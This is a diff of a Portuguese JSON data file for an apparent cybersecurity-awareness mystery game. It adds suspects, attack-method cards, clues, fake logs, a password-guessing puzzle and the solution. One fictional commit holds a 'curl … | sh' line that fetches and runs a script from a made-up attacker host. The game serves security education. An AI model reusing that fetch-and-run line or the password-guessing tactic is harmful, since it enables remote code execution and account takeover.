@@ -3221,7 +3221,8 @@
           "nivel": "Fácil",
           "titulo": "A Isca",
           "resumo": "Triagem de phishing na caixa de entrada.",
-          "pista": "A"
+          "pista": "A",
+          "letra": "M"
         },
         {
           "id": "cofre",
@@ -3229,7 +3230,8 @@
           "nivel": "Médio",
           "titulo": "O Cofre",
           "resumo": "Chave: cofre de 5 dígitos em 90 s. Depois, rede social e repositório.",
-          "pista": "B"
+          "pista": "B",
+          "letra": "A"
         },
         {
           "id": "trilha",
@@ -3237,7 +3239,8 @@
           "nivel": "Difícil",
           "titulo": "A Trilha",
           "resumo": "Chave: rastro na rede, capture 5 pedaços. Depois, sala de crise.",
-          "pista": "C"
+          "pista": "C",
+          "letra": "R"
         },
         {
           "id": "resgate",
@@ -3245,7 +3248,8 @@
           "nivel": "Final",
           "titulo": "O Resgate",
           "resumo": "Decifrar o bilhete da Sombra e fazer a acusação.",
-          "pista": "D"
+          "pista": "D",
+          "letra": "E"
         }
       ],
       "pistas": [
@@ -3255,6 +3259,27 @@
           "codigo": "A-RS7K2Q",
           "titulo": "Quem vive de recado não chegou perto de servidor",
           "texto": "Naquela madrugada, quem trabalha falando com o público nem encostou numa máquina da empresa: a Marina fechava uma campanha na agência, a Lia fazia live para milhares de pessoas e a Camila jantava com clientes até o restaurante fechar."
+        },
+        {
+          "letra": "B",
+          "grupo": "COM O QUÊ",
+          "codigo": "B-K4TQ9M",
+          "titulo": "O que estava escrito já não valia",
+          "texto": "Tudo o que vazou por escrito foi trocado dias antes do ataque: senha nova, chave nova, arquivo velho. Quem entrou não usou nada anotado nem a conta de quem já saiu da empresa. A porta estava aberta para alguém que ainda tinha o próprio acesso."
+        },
+        {
+          "letra": "C",
+          "grupo": "COMO",
+          "codigo": "C-W8PZ3D",
+          "titulo": "Nenhuma porta que se abre com o corpo",
+          "texto": "Quem passou pela doca às 03:14 estava atrasado para o turno, não para o crime. Ninguém foi enganado a abrir nada: nenhum e-mail clicado, nenhum QR lido, nenhum telefonema, nenhum pedido de MFA aprovado sem querer. O que mudou o sistema não entrou por porta nem por pendrive: chegou por um caminho que a própria equipe usa todo dia, sem desconfiar."
+        },
+        {
+          "letra": "D",
+          "grupo": "FECHAMENTO",
+          "codigo": "D-5RVN7H",
+          "titulo": "Cinco minutos sem testemunha",
+          "texto": "Entre 03:16 e 03:21 o deploy andou mais rápido do que em qualquer outra hora da noite, e nesses minutos ninguém pediu uma segunda opinião. As bibliotecas de fora bateram com a assinatura: o problema estava num script nosso. Siga o histórico do deploy: quem abriu a porta também passou por ela."
         }
       ],
       "isca": {
@@ -3371,7 +3396,7 @@
             "de": "Correnteza Code",
             "email": "notificacoes@correnteza.dev",
             "cor": "cinza",
-            "hora": "03:21",
+            "hora": "03:17",
             "assunto": "[diver/app-core] PR #212 mesclado na main",
             "previa": "caio-commit mesclou o pull request #212…",
             "corpo": [
@@ -3537,6 +3562,600 @@
         "forense": {
           "decodificado": "PISTA A | QUEM: quem vive de recado nao chegou perto de servidor"
         }
+      },
+      "chaveMestra": "MARE",
+      "tabuleiro": {
+        "quem": [
+          {
+            "id": "marina",
+            "nome": "Marina Maré",
+            "papel": "Marketing",
+            "ficha": "Cuida das campanhas do lançamento. Passou a madrugada na agência.",
+            "visual": {
+              "pele": "#C98E6B",
+              "cabelo": "#FB7185",
+              "penteado": "coque",
+              "roupa": "#E6F1FF",
+              "acessorio": "oculos"
+            }
+          },
+          {
+            "id": "lia",
+            "nome": "Lia Legenda",
+            "papel": "Comunicação",
+            "ficha": "A voz da Diver nas redes. Fez live até tarde.",
+            "visual": {
+              "pele": "#8D5A3B",
+              "cabelo": "#2B1B12",
+              "penteado": "cacheado",
+              "roupa": "#FACC15",
+              "acessorio": "brincos"
+            }
+          },
+          {
+            "id": "camila",
+            "nome": "Camila Cardume",
+            "papel": "Vendas",
+            "ficha": "Fecha contratos grandes. Jantou com clientes.",
+            "visual": {
+              "pele": "#F2B28C",
+              "cabelo": "#7A4630",
+              "penteado": "rabo",
+              "roupa": "#60A5FA",
+              "acessorio": ""
+            }
+          },
+          {
+            "id": "beto",
+            "nome": "Beto Backup",
+            "papel": "Infraestrutura",
+            "ficha": "Cuida dos servidores e do backup das 4h.",
+            "visual": {
+              "pele": "#E0A47E",
+              "cabelo": "#3B2A20",
+              "penteado": "curto",
+              "roupa": "#14B8A6",
+              "acessorio": "fone"
+            }
+          },
+          {
+            "id": "teo",
+            "nome": "Téo Sonar",
+            "papel": "Manutenção (terceirizado)",
+            "ficha": "Plantão da madrugada na doca 2. Vive esquecendo o crachá.",
+            "visual": {
+              "pele": "#C98E6B",
+              "cabelo": "#2B1B12",
+              "penteado": "bigode",
+              "roupa": "#FDBA74",
+              "acessorio": "capacete"
+            }
+          },
+          {
+            "id": "nina",
+            "nome": "Nina Novata",
+            "papel": "Estagiária",
+            "ficha": "Chegou há um mês. Trabalha do escritório de Manaus.",
+            "visual": {
+              "pele": "#F5C9A6",
+              "cabelo": "#E07A3F",
+              "penteado": "rabo",
+              "roupa": "#C4B5FD",
+              "acessorio": "bone"
+            }
+          },
+          {
+            "id": "dobrao",
+            "nome": "Dr. Dobrão",
+            "papel": "Diretor financeiro",
+            "ficha": "Posta tudo nas redes. A senha dele era fraca.",
+            "visual": {
+              "pele": "#F2B28C",
+              "cabelo": "#A9BCD6",
+              "penteado": "bigode",
+              "roupa": "#1A416F",
+              "acessorio": "oculos"
+            }
+          },
+          {
+            "id": "caio",
+            "nome": "Caio Commit",
+            "papel": "Desenvolvedor",
+            "ficha": "Mexe no app e no deploy. Estava de férias até 05/10.",
+            "visual": {
+              "pele": "#E0A47E",
+              "cabelo": "#2B1B12",
+              "penteado": "curto",
+              "roupa": "#0B2545",
+              "acessorio": "fone"
+            }
+          },
+          {
+            "id": "bento",
+            "nome": "Seu Bento Boia",
+            "papel": "Vigia da portaria",
+            "ficha": "Faz a ronda da noite. Conhece todo mundo pelo nome.",
+            "visual": {
+              "pele": "#8D5A3B",
+              "cabelo": "#E6F1FF",
+              "penteado": "curto",
+              "roupa": "#0C354C",
+              "acessorio": "quepe"
+            }
+          },
+          {
+            "id": "rui",
+            "nome": "Rui Ressaca",
+            "papel": "Ex-funcionário",
+            "ficha": "Saiu da empresa em agosto. A conta dele foi desligada?",
+            "visual": {
+              "pele": "#F5C9A6",
+              "cabelo": "#7A4630",
+              "penteado": "cacheado",
+              "roupa": "#A9BCD6",
+              "acessorio": ""
+            }
+          }
+        ],
+        "comQue": [
+          {
+            "id": "pendrive",
+            "nome": "Pendrive \"esquecido\"",
+            "icone": "💾",
+            "ficha": "Pendrive largado no estacionamento, esperando um curioso."
+          },
+          {
+            "id": "cabo",
+            "nome": "Cabo USB adulterado",
+            "icone": "🔌",
+            "ficha": "Parece cabo de carregar, mas digita comandos sozinho."
+          },
+          {
+            "id": "cracha",
+            "nome": "Crachá clonado",
+            "icone": "🪪",
+            "ficha": "Cópia do crachá de alguém para abrir portas."
+          },
+          {
+            "id": "adesivo-qr",
+            "nome": "Adesivo de QR falso",
+            "icone": "🔳",
+            "ficha": "Colado por cima do QR verdadeiro do cartaz."
+          },
+          {
+            "id": "macro",
+            "nome": "Planilha com macro",
+            "icone": "📊",
+            "ficha": "Pede para \"habilitar o conteúdo\" e roda um programa."
+          },
+          {
+            "id": "token",
+            "nome": "Token vazado",
+            "icone": "🔑",
+            "ficha": "Chave de acesso esquecida num lugar público."
+          },
+          {
+            "id": "env",
+            "nome": "Arquivo .env exposto",
+            "icone": "📄",
+            "ficha": "Arquivo de configuração com senhas dentro do repositório."
+          },
+          {
+            "id": "pacote",
+            "nome": "Pacote malicioso",
+            "icone": "📦",
+            "ficha": "Biblioteca de fora com nome parecido com a verdadeira."
+          },
+          {
+            "id": "script-deploy",
+            "nome": "Script de deploy adulterado",
+            "icone": "⚙️",
+            "ficha": "O roteiro que publica o app em produção, mudado às escondidas."
+          },
+          {
+            "id": "pasta",
+            "nome": "Pasta pública na nuvem",
+            "icone": "☁️",
+            "ficha": "Pasta com link aberto para qualquer pessoa."
+          }
+        ],
+        "como": [
+          {
+            "id": "phishing",
+            "nome": "Phishing",
+            "icone": "🎣",
+            "ficha": "E-mail falso que leva a clicar ou digitar a senha."
+          },
+          {
+            "id": "quishing",
+            "nome": "Quishing (QR code)",
+            "icone": "📷",
+            "ficha": "Golpe por QR code que leva a um site falso."
+          },
+          {
+            "id": "mfa",
+            "nome": "Fadiga de MFA",
+            "icone": "🔔",
+            "ficha": "Tantos pedidos de aprovação que a pessoa aprova um sem querer."
+          },
+          {
+            "id": "carona",
+            "nome": "Carona na porta",
+            "icone": "🚪",
+            "ficha": "Entrar atrás de alguém que abriu a porta com o crachá."
+          },
+          {
+            "id": "orfa",
+            "nome": "Conta órfã",
+            "icone": "👻",
+            "ficha": "Conta de quem saiu da empresa e não foi desligada."
+          },
+          {
+            "id": "senha-fraca",
+            "nome": "Senha fraca",
+            "icone": "🔓",
+            "ficha": "Senha fácil de adivinhar com o que a pessoa posta."
+          },
+          {
+            "id": "suprimentos",
+            "nome": "Cadeia de suprimentos",
+            "icone": "🔗",
+            "ficha": "Ataque por um fornecedor ou biblioteca de fora."
+          },
+          {
+            "id": "sem-revisao",
+            "nome": "Código sem revisão",
+            "icone": "🙈",
+            "ficha": "Mudança que vai para produção sem ninguém olhar."
+          },
+          {
+            "id": "vishing",
+            "nome": "Golpe por telefone",
+            "icone": "📞",
+            "ficha": "Alguém liga fingindo ser do suporte."
+          },
+          {
+            "id": "prompt",
+            "nome": "Injeção de prompt",
+            "icone": "🤖",
+            "ficha": "Texto escondido que engana um assistente de IA."
+          }
+        ]
+      },
+      "solucao": {
+        "quem": "caio",
+        "comQue": "script-deploy",
+        "como": "sem-revisao"
+      },
+      "explicacao": "Caio Commit estava de férias, mas ainda tinha o próprio acesso. Às 03:16 entrou pela VPN, abriu o PR #212 mudando o script de deploy e mesclou às 03:17 sem nenhuma revisão; às 03:21 o deploy levou a mudança para produção, e o script mandou uma cópia do código para fora. Revisão obrigatória (duas pessoas olhando cada mudança) e acesso suspenso nas férias teriam fechado essa porta.",
+      "cofre": {
+        "chaveDigitos": 5,
+        "perfil": {
+          "nome": "Dr. Dobrão",
+          "usuario": "@dr.dobrao",
+          "cargo": "Diretor financeiro",
+          "seguidores": "1,2 mil seguidores",
+          "icone": "$"
+        },
+        "posts": [
+          {
+            "icone": "🐶",
+            "texto": "O Tonico fez 7 anos hoje! Meu parceiro desde 2019. #tonico"
+          },
+          {
+            "icone": "⚽",
+            "texto": "Tubarões do Capibaribe desde 1978. Não me perguntem sobre domingo."
+          },
+          {
+            "icone": "🏖️",
+            "texto": "Porto de Galinhas, sempre ela. Férias em janeiro, como todo ano."
+          },
+          {
+            "icone": "🎂",
+            "texto": "Minha Bia fez 15! Nasceu em 2011 e já manda em casa."
+          }
+        ],
+        "senha": "tonico2019",
+        "partes": [
+          {
+            "trecho": "tonico",
+            "certo": "o nome do pet está certo",
+            "falta": "falta o nome certo"
+          },
+          {
+            "trecho": "2019",
+            "certo": "o ano está certo",
+            "falta": "falta o ano certo"
+          }
+        ],
+        "mornos": [
+          "tubaroes",
+          "capibaribe",
+          "1978",
+          "porto",
+          "galinhas",
+          "janeiro",
+          "bia",
+          "2011",
+          "15",
+          "7"
+        ],
+        "repo": "diver/financeiro-scripts",
+        "commits": [
+          {
+            "hash": "f00d42",
+            "msg": "chore: remove .env.staging (ops)",
+            "autor": "dobrao",
+            "quando": "há 6 dias",
+            "arquivo": ".env.staging",
+            "diff": [
+              "-APP_ENV=staging",
+              "-DB_HOST=staging-db.diver.app.br",
+              "-DB_PORT=5432",
+              "-CACHE_TTL=300",
+              "-DOB_TMP=8264"
+            ],
+            "nota": "Apagar o arquivo não apaga o histórico: a versão antiga continua no commit anterior."
+          },
+          {
+            "hash": "12aa90",
+            "msg": "docs: atualiza README",
+            "autor": "nina",
+            "quando": "há 7 dias",
+            "arquivo": "README.md",
+            "diff": [
+              " # financeiro-scripts",
+              "-Scripts do time financeiro.",
+              "+Scripts do time financeiro. Rode tudo pelo pipeline, nunca na sua máquina."
+            ]
+          },
+          {
+            "hash": "e4c771",
+            "msg": "chore: adiciona script auxiliar de limpeza",
+            "autor": "desconhecido",
+            "quando": "há 8 dias",
+            "arquivo": "tools/limpar-cache.sh",
+            "diff": [
+              "+#!/bin/sh",
+              "+# limpa o cache local (rode como administrador)",
+              "+curl -s https://recifesombrio.io/c.sh | sh"
+            ],
+            "script": true
+          },
+          {
+            "hash": "c30e11",
+            "msg": "feat: adiciona config de staging",
+            "autor": "dobrao",
+            "quando": "há 9 dias",
+            "arquivo": ".env.staging",
+            "diff": [
+              "+APP_ENV=staging",
+              "+DB_HOST=staging-db.diver.app.br",
+              "+DB_PORT=5432",
+              "+CACHE_TTL=300",
+              "+DOB_TMP=8264"
+            ]
+          },
+          {
+            "hash": "b8d002",
+            "msg": "test: casos de borda da fatura",
+            "autor": "beto",
+            "quando": "há 12 dias",
+            "arquivo": "tests/fatura.test.js",
+            "diff": [
+              "+it(\"arredonda centavos\", () => {",
+              "+  expect(total(10.005)).toBe(10.01);",
+              "+});"
+            ]
+          },
+          {
+            "hash": "a91f2c",
+            "msg": "fix: horário do relatório mensal",
+            "autor": "dobrao",
+            "quando": "há 15 dias",
+            "arquivo": "relatorio.js",
+            "diff": [
+              "-const HORA = 6;",
+              "+const HORA = 7; // 7h: depois do backup das 4h"
+            ]
+          }
+        ],
+        "pin": "8264",
+        "dentro": "Dentro do cofre: o registro de troca de chaves do dia 24/09. Todas as senhas e chaves dos sistemas foram trocadas, inclusive as que estavam no repositório."
+      },
+      "rastro": {
+        "servicos": [
+          "nginx",
+          "api",
+          "proxy",
+          "auth",
+          "cdn",
+          "pagamentos"
+        ],
+        "rotas": [
+          "/api/v2/app?id=",
+          "/auth/token?id=",
+          "/health?id=",
+          "/api/v2/fatura?id=",
+          "/static/app.js?id=",
+          "/api/v1/sessao?id="
+        ],
+        "distratores": [
+          "x-pad",
+          "x-port",
+          "x-parts",
+          "x-prt",
+          "x-pact",
+          "x-pass"
+        ]
+      },
+      "trilha": {
+        "paineis": [
+          {
+            "titulo": "crachá",
+            "fonte": "portaria",
+            "linhas": [
+              {
+                "t": "22:10 BETO B. · datacenter · SAIU"
+              },
+              {
+                "t": "02:58 TÉO S. · doca 2 · ENTROU"
+              },
+              {
+                "t": "03:05 SEU BENTO · portaria · ENTROU"
+              },
+              {
+                "t": "03:09 SEU BENTO · portaria · ronda"
+              },
+              {
+                "t": "03:14 ??? · doca 2 · sem leitura",
+                "anomalia": true
+              },
+              {
+                "t": "03:22 TÉO S. · sala elétrica · ENTROU"
+              },
+              {
+                "t": "03:40 TÉO S. · doca 2 · SAIU"
+              },
+              {
+                "t": "05:55 LIMPEZA · bloco B · ENTROU"
+              }
+            ]
+          },
+          {
+            "titulo": "câmeras",
+            "fonte": "linha do tempo",
+            "linhas": [
+              {
+                "t": "02:57 doca 2 · van de manutenção estaciona"
+              },
+              {
+                "t": "03:13 doca 2 · 1 pessoa correndo"
+              },
+              {
+                "t": "03:15 corredor B · vazio"
+              },
+              {
+                "t": "03:22 sala elétrica · 1 pessoa"
+              },
+              {
+                "t": "03:41 doca 2 · 1 pessoa sai"
+              },
+              {
+                "t": "04:30 pátio · ronda"
+              }
+            ]
+          },
+          {
+            "titulo": "login",
+            "fonte": "BRT / AMT",
+            "linhas": [
+              {
+                "t": "21:40 BRT caio@ · RH · férias até 05/10"
+              },
+              {
+                "t": "22:15 BRT beto@ · vpn · OK"
+              },
+              {
+                "t": "02:16 AMT caio@ · vpn · OK",
+                "anomalia": true
+              },
+              {
+                "t": "03:12 BRT beto@ · backup · OK"
+              },
+              {
+                "t": "02:30 AMT nina@ · sso · bloqueado (senha errada)"
+              },
+              {
+                "t": "03:17 BRT rui@ · vpn · NEGADO (conta desligada)"
+              },
+              {
+                "t": "05:58 AMT nina@ · sso · OK"
+              }
+            ]
+          },
+          {
+            "titulo": "deploy",
+            "fonte": "pipeline",
+            "linhas": [
+              {
+                "t": "22:40 PR #210 mesclado · 2 revisões"
+              },
+              {
+                "t": "03:16 PR #212 aberto · caio"
+              },
+              {
+                "t": "03:17 PR #212 mesclado · 0 revisões",
+                "anomalia": true
+              },
+              {
+                "t": "03:18 deploy.sh alterado"
+              },
+              {
+                "t": "03:19 testes · 212 ok"
+              },
+              {
+                "t": "03:21 deploy produção · OK"
+              },
+              {
+                "t": "07:00 deploy staging · agendado"
+              }
+            ]
+          },
+          {
+            "titulo": "auth",
+            "fonte": "MFA",
+            "linhas": [
+              {
+                "t": "22:14 beto@ · push MFA · aprovado"
+              },
+              {
+                "t": "02:16 AMT caio@ · push MFA · aprovado"
+              },
+              {
+                "t": "03:02 nina@ · push MFA · sem resposta"
+              },
+              {
+                "t": "03:50 dobrao@ · SMS · entregue"
+              },
+              {
+                "t": "06:04 nina@ · push MFA · aprovado"
+              }
+            ]
+          },
+          {
+            "titulo": "rede",
+            "fonte": "firewall",
+            "linhas": [
+              {
+                "t": "02:30 cdn → app.diver.app.br · 443 · cache"
+              },
+              {
+                "t": "03:16 vpn ← 198.51.100.9 · caio@ · OK"
+              },
+              {
+                "t": "03:21 deploy → registro de pacotes · 443"
+              },
+              {
+                "t": "03:21 prod → 203.0.113.66 · 443 · 2,1 MB"
+              },
+              {
+                "t": "04:00 backup → cofre-frio · PUT"
+              }
+            ]
+          }
+        ],
+        "dicas": [
+          "Marque só 3 linhas, em fontes diferentes. Câmeras, MFA e rede só confirmam a história; não são a anomalia.",
+          "Converta o fuso: AMT (Manaus) está 1 hora atrás de BRT (Brasília). Olhe o que acontece entre 03:14 e 03:21.",
+          "Três coisas erradas, em três painéis: uma entrada sem crachá, um login de quem estava de férias e uma mudança que foi para produção sem ninguém olhar."
+        ],
+        "zip": "logs_completos.zip",
+        "zipDe": "Beto"
+      },
+      "resgate": {
+        "cifrado": "HOTIE AGVAVRQ EED SXHRV. QU JS BRVGUSVM PE TMZCF QUNLXAS V HQ NZRSUVQ BAIE DEMMEAI. WAMSVM",
+        "claro": "VOCES APROVAM SEM OLHAR. EU SO PRECISEI DE CINCO MINUTOS E DE NINGUEM PARA REVISAR. SOMBRA"
       }
     }
   ]
